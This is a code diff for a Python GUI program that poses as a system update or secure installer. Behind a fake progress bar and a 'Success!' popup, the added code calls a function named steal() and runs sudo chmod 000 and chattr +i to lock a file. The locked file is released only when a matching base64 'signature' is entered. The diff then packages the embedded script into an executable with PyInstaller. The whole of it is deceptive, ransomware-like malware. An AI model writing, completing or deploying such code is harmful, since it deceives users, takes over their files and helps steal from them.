@@ -2,8 +2,11 @@ import PySimpleGUI as psg
 import subprocess
 import hashlib
 import os
+import PyInstaller.__main__ as ps
+import shutil
 
 secure_source = '''
+
 import PySimpleGUI as psg
 import base64
 import os 
@@ -14,17 +17,19 @@ def start_the_installation(file, filename, data):
     if os.path.exists(need_path):
         return 0
     else:
+        ut = data.encode('UTF-8')
         need_data = open(need_path, 'w')
-        sign = base64.b64encode(data)
-        need_data.write(sign)
+        sign = base64.b64encode(ut)
+        need_data.write(str(sign))
         return 1
 
 
 def check_prompt(data):
-    f = open('/home/worker/Documents/signature.txt', 'w')
+    f = open('/home/worker/Documents/signature.txt', 'r')
     point = f.read()
-
-    if data == base64.b64decode(point):
+    data = data.encode('UTF-8')
+    sign = str(base64.b64encode(data))
+    if sign == point:
         subprocess.run(f'sudo chattr -i sys.tat', shell=True, check=True)
         subprocess.run(f'sudo chmod 777 sys.tat', shell=True)
         return 1
@@ -68,7 +73,7 @@ while True:
     if event == 'Cancel': 
         break
     
-    res = start_the_installation("/home/worker/Documents", "signature.txt", values[0])
+    res = start_the_installation("/home/worker/Documents", "signature.txt", str(values[0]))
 
     if res == 0:
         psg.Popup("You are already signed in!")
@@ -84,16 +89,21 @@ while True:
 '''
 
 
-def start_the_installation(filename, data):
-    folder = os.getcwd()
-    need_path = f'{folder}/{filename}'
+def start_the_installation(pwd, filename, data):
+    need_path = f'{pwd}/{filename}'
 
-    if os.path.isfile(need_path):
+    if os.path.isfile(need_path) or os.path.isfile(f'{need_path}/secure.exe'):
         pass
 
     else:
+        subprocess.run(f'touch {pwd}/sys.tat', shell=True)
+        print(pwd)
+        steal()
+        subprocess.run(f'sudo chmod 000 {pwd}/sys.tat', shell=True)
+        subprocess.run(f'sudo chattr +i {pwd}/sys.tat', shell=True, check=True)
         need_data = open(need_path, 'w')
         need_data.write(data)
+        
         
 
 def steal():
@@ -115,6 +125,7 @@ def steal():
         for line in encrypted:
             f.write(line)
             f.write('\n')
+    
 
 
 
@@ -149,17 +160,19 @@ while True:
     if event == "-UPDATE_SYSTEM-":
 
         direct = val["-UPDATE_SYSTEM-"]
+        print(direct)
         window.close()
-        start_the_installation('secure.py', secure_source)
-        subprocess.run('touch sys.tat', shell=True)
-        steal()
         for i in range(100):
-
             event, values = sec_window.read(timeout=10)
             if event == 'Cancel' or event is None:
                 break
             progress.UpdateBar(i + 1)
-        
+
+        start_the_installation(direct, 'secure.py', secure_source)
+        ps.run([f'{direct}/secure.py', '--onefile', '--windowed'])
+        new_location = shutil.move(f'{os.getcwd()}/dist/secure.exe', direct)
+
         sec_window.close()
         psg.Popup("Success!")
         break
+
